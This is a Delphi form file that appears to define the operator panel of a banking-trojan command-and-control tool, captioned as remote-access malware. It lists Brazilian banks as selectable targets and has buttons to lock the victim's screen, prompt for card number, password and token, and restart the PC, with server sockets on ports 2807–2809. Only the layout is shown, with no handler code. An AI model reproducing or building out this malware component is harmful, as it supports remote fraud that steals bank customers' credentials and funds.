object Form1: TForm1
  Left = 0
  Top = 0
  BorderStyle = bsSingle
  Caption = 'C&C Malware Acesso Remoto fam5 - Banrisul'
  ClientHeight = 750
  ClientWidth = 1301
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'Tahoma'
  Font.Style = []
  OldCreateOrder = False
  Position = poScreenCenter
  WindowState = wsMaximized
  OnCreate = FormCreate
  PixelsPerInch = 96
  TextHeight = 13
  object Image1: TImage
    Left = 200
    Top = 8
    Width = 1366
    Height = 768
    AutoSize = True
    OnClick = Image1Click
  end
  object Label1: TLabel
    Left = 8
    Top = 37
    Width = 30
    Height = 13
    Caption = 'status'
  end
  object Label2: TLabel
    Left = 8
    Top = 661
    Width = 76
    Height = 13
    Caption = 'Texto recebido:'
  end
  object Label3: TLabel
    Left = 98
    Top = 632
    Width = 31
    Height = 13
    Caption = 'Label3'
  end
  object Label6: TLabel
    Left = 7
    Top = 215
    Width = 31
    Height = 13
    Caption = 'Nome:'
  end
  object Button1: TButton
    Left = 8
    Top = 8
    Width = 75
    Height = 25
    Caption = 'Ativar'
    TabOrder = 0
    OnClick = Button1Click
  end
  object Button2: TButton
    Left = 89
    Top = 8
    Width = 75
    Height = 25
    Caption = 'Desativar'
    TabOrder = 1
    OnClick = Button2Click
  end
  object RadioGroup1: TRadioGroup
    Left = 8
    Top = 56
    Width = 177
    Height = 145
    Caption = 'Sele'#231#227'o do alvo'
    TabOrder = 2
  end
  object RadioButton1: TRadioButton
    Left = 16
    Top = 80
    Width = 113
    Height = 17
    Caption = 'BB - F'
    TabOrder = 3
    OnClick = RadioButton1Click
  end
  object RadioButton2: TRadioButton
    Left = 16
    Top = 93
    Width = 59
    Height = 17
    Caption = 'HSBC'
    TabOrder = 4
    OnClick = RadioButton2Click
  end
  object RadioButton3: TRadioButton
    Left = 16
    Top = 107
    Width = 59
    Height = 17
    Caption = 'Ita'#250' - F'
    TabOrder = 5
    OnClick = RadioButton3Click
  end
  object RadioButton4: TRadioButton
    Left = 16
    Top = 120
    Width = 59
    Height = 17
    Caption = 'Brd - F'
    TabOrder = 6
    OnClick = RadioButton14Click
  end
  object RadioButton5: TRadioButton
    Left = 81
    Top = 133
    Width = 73
    Height = 17
    Caption = 'Banrisul'
    TabOrder = 7
    OnClick = RadioButton5Click
  end
  object RadioButton6: TRadioButton
    Left = 16
    Top = 147
    Width = 59
    Height = 17
    Caption = 'Sant - F'
    TabOrder = 8
    OnClick = RadioButton15Click
  end
  object RadioButton7: TRadioButton
    Left = 81
    Top = 93
    Width = 59
    Height = 17
    Caption = 'Sicoob'
    TabOrder = 9
    OnClick = RadioButton7Click
  end
  object RadioButton8: TRadioButton
    Left = 16
    Top = 133
    Width = 50
    Height = 17
    Caption = 'Sicredi'
    TabOrder = 10
    OnClick = RadioButton8Click
  end
  object RadioButton9: TRadioButton
    Left = 16
    Top = 162
    Width = 113
    Height = 17
    Caption = 'Caixa E. Federal'
    TabOrder = 11
    OnClick = RadioButton9Click
  end
  object RadioButton10: TRadioButton
    Left = 120
    Top = 162
    Width = 43
    Height = 17
    Caption = 'BRB'
    TabOrder = 12
    OnClick = RadioButton10Click
  end
  object RadioButton11: TRadioButton
    Left = 16
    Top = 177
    Width = 113
    Height = 17
    Caption = 'Citibank'
    TabOrder = 13
    OnClick = RadioButton11Click
  end
  object RadioButton12: TRadioButton
    Left = 81
    Top = 107
    Width = 83
    Height = 17
    Caption = 'Ita'#250' - J'
    TabOrder = 14
    OnClick = RadioButton12Click
  end
  object RadioGroup2: TRadioGroup
    Left = 8
    Top = 234
    Width = 177
    Height = 272
    Caption = 'A'#231#227'o'
    TabOrder = 15
  end
  object Button3: TButton
    Left = 16
    Top = 250
    Width = 75
    Height = 25
    Caption = 'Travar tela'
    TabOrder = 16
    OnClick = Button3Click
  end
  object Button4: TButton
    Left = 97
    Top = 250
    Width = 75
    Height = 25
    Caption = 'Desconectar'
    TabOrder = 17
    OnClick = Button4Click
  end
  object Button8: TButton
    Left = 98
    Top = 281
    Width = 75
    Height = 25
    Caption = 'Reiniciar PC'
    TabOrder = 18
    OnClick = Button8Click
  end
  object Edit3: TEdit
    Left = 8
    Top = 597
    Width = 177
    Height = 21
    TabOrder = 19
  end
  object Button11: TButton
    Left = 8
    Top = 624
    Width = 75
    Height = 25
    Caption = 'Enviar texto'
    TabOrder = 20
    OnClick = Button11Click
  end
  object Edit4: TEdit
    Left = 8
    Top = 678
    Width = 186
    Height = 21
    TabOrder = 21
  end
  object Button12: TButton
    Left = 129
    Top = 624
    Width = 25
    Height = 25
    Caption = '+'
    TabOrder = 22
    OnClick = Button12Click
  end
  object Button13: TButton
    Left = 160
    Top = 624
    Width = 25
    Height = 25
    Caption = '-'
    TabOrder = 23
    OnClick = Button13Click
  end
  object RadioButton13: TRadioButton
    Left = 81
    Top = 80
    Width = 70
    Height = 17
    Caption = 'BB - J'
    TabOrder = 24
    OnClick = RadioButton11Click
  end
  object RadioButton14: TRadioButton
    Left = 81
    Top = 120
    Width = 59
    Height = 17
    Caption = 'Brd - J'
    TabOrder = 25
    OnClick = RadioButton14Click
  end
  object RadioButton15: TRadioButton
    Left = 81
    Top = 147
    Width = 59
    Height = 17
    Caption = 'Sant - J'
    TabOrder = 26
    OnClick = RadioButton15Click
  end
  object Edit5: TEdit
    Left = 44
    Top = 207
    Width = 141
    Height = 21
    TabOrder = 27
    Text = 'Edit5'
  end
  object Button5: TButton
    Left = 17
    Top = 281
    Width = 75
    Height = 25
    Caption = 'cartao'
    TabOrder = 28
    OnClick = Button5Click
  end
  object Button6: TButton
    Left = 17
    Top = 312
    Width = 75
    Height = 25
    Caption = 'senha'
    TabOrder = 29
    OnClick = Button6Click
  end
  object Button7: TButton
    Left = 98
    Top = 312
    Width = 75
    Height = 25
    Caption = 'token'
    TabOrder = 30
    OnClick = Button7Click
  end
  object Button9: TButton
    Left = 17
    Top = 343
    Width = 75
    Height = 25
    Caption = 'Sucesso'
    TabOrder = 31
    OnClick = Button9Click
  end
  object Memo1: TMemo
    Left = 8
    Top = 417
    Width = 177
    Height = 174
    Lines.Strings = (
      'Memo1')
    TabOrder = 32
  end
  object s1: TServerSocket
    Active = False
    Port = 2807
    ServerType = stNonBlocking
    OnClientConnect = s1ClientConnect
    OnClientDisconnect = s1ClientDisconnect
    OnClientRead = s1ClientRead
    Left = 16
    Top = 40
  end
  object Timer1: TTimer
    Enabled = False
    Interval = 15000
    OnTimer = Timer1Timer
    Left = 168
    Top = 344
  end
  object s3: TServerSocket
    Active = False
    Port = 2808
    ServerType = stNonBlocking
    OnClientRead = s3ClientRead
    Left = 96
    Top = 40
  end
  object server: TIdTCPServer
    Bindings = <
      item
        IP = '0.0.0.0'
        Port = 2809
      end>
    DefaultPort = 0
    OnExecute = serverExecute
    Left = 144
    Top = 40
  end
end
